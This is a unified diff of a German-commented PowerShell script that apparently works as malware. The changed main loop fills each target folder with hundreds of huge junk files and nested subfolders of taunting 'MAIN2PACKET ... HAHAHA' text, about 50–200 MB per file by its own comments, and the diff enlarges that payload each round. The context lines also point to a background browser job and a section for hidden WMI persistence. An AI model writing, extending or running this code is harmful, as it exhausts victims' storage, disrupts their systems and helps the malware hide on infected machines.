@@ -210,42 +210,63 @@ $browserJob = Start-Job -ScriptBlock {
     }
 }
 
-# ===== HAUPTSCHLEIFE =====
+# ===== HAUPTSCHLEIFE - NUR HINZUFÜGEN, NICHTS LÖSCHEN =====
 while ($global:currentRound -lt $global:maxRounds) {
     $global:currentRound++
     
     # JEDES ZIEL IN DER LISTE BEARBEITEN!
     foreach ($ziel in $alleZiele) {
         if (Test-Path $ziel) {
-            # Hauptordner erstellen
-            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$global:currentRound"
+            # Hauptordner mit Runden-Nummer (löscht nichts, erstellt nur neu)
+            $mainFolder = Join-Path $ziel "MAIN2PACKET_RUNDE_$global:currentRound"
             try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
             
-            # 500 DATEIEN PRO ZIEL
-            for ($i = 1; $i -le 1000; $i++) {
-                # Direkt im Zielordner
-                "$env:COMPUTERNAME - MAIN2PACKET IST ÜBERALL DASS WAR MIT DIR HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $ziel "MAIN2PACKET_SCAN_$i.king") -Encoding UTF8 -Force
+            # 500 DATEIEN PRO ZIEL - JEDE RUNDE NEUE DATEIEN!
+            for ($i = 1; $i -le 500; $i++) {
+                # RIESIGER TEXT für jede Datei (ca. 50 MB)
+                $riesenText = "MAIN2PACKET RUNDE $global:currentRound - DATEI $i - " + "HAHAHA " * 500000
                 
-                # Im Hauptordner
-                "$env:COMPUTERNAME - MAIN2PACKET IST ÜBERALL DAS WARS MIT DIR HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $mainFolder "file_$i.king") -Encoding UTF8 -Force
+                # Direkt im Zielordner - mit Runden-Nummer im Dateinamen (überschreibt nichts!)
+                $zielDatei = Join-Path $ziel "MAIN2PACKET_RUNDE${global:currentRound}_DATEI${i}.king"
+                $riesenText | Out-File $zielDatei -Encoding UTF8 -Force
+                
+                # Im Hauptordner - auch mit eindeutigem Namen
+                $hauptDatei = Join-Path $mainFolder "RUNDE${global:currentRound}_FILE${i}.king"
+                $riesenText | Out-File $hauptDatei -Encoding UTF8 -Force
             }
             
-            # 500 UNTERORDNER
-            for ($u = 1; $u -le 1000; $u++) {
-                $subFolder = Join-Path $mainFolder "SUB_$u"
+            # 500 UNTERORDNER - AUCH JEDE RUNDE NEU
+            for ($u = 1; $u -le 500; $u++) {
+                $subFolder = Join-Path $mainFolder "SUB_RUNDE${global:currentRound}_$u"
                 New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
                 
                 # 500 DATEIEN PRO UNTERORDNER
-                for ($s = 1; $s -le 1000; $s++) {
-                    $subFile = Join-Path $subFolder "subfile_$s.king"
-                    "SUB-ORDNER $u - DATEI $s" | Out-File $subFile -Encoding UTF8 -Force
+                for ($s = 1; $s -le 500; $s++) {
+                    $subFile = Join-Path $subFolder "sub_${global:currentRound}_${u}_${s}.king"
+                    $subText = "SUB RUNDE $global:currentRound - ORDNER $u - DATEI $s - " + "MAIN2PACKET " * 200000
+                    $subText | Out-File $subFile -Encoding UTF8 -Force
                 }
+            }
+            
+            # ZUSATZ: JEDE RUNDE EINEN "RIESEN"-ORDNER mit EXTRA GROSSEN DATEIEN
+            $gigaFolder = Join-Path $mainFolder "GIGA_RUNDE_$global:currentRound"
+            New-Item -Path $gigaFolder -ItemType Directory -Force | Out-Null
+            
+            for ($g = 1; $g -le 100; $g++) {
+                $gigaFile = Join-Path $gigaFolder "GIGA_${global:currentRound}_$g.king"
+                
+                # WIRKLICH RIESIGE DATEI (ca. 100-200 MB)
+                $gigaText = ""
+                for ($l = 0; $l -lt 2000; $l++) {
+                    $gigaText += "ZEILE $l RUNDE $global:currentRound: " + ("MAIN2PACKET" * 5000) + "`r`n"
+                }
+                $gigaText | Out-File $gigaFile -Encoding UTF8 -Force
             }
         }
     }
     
     # KURZE PAUSE ZWISCHEN RUNDEN
-    Start-Sleep -Seconds 1
+    Start-Sleep -Seconds 2
 }
 
 # ===== WMI PERSISTENZ (MAXIMAL VERSTECKT) =====
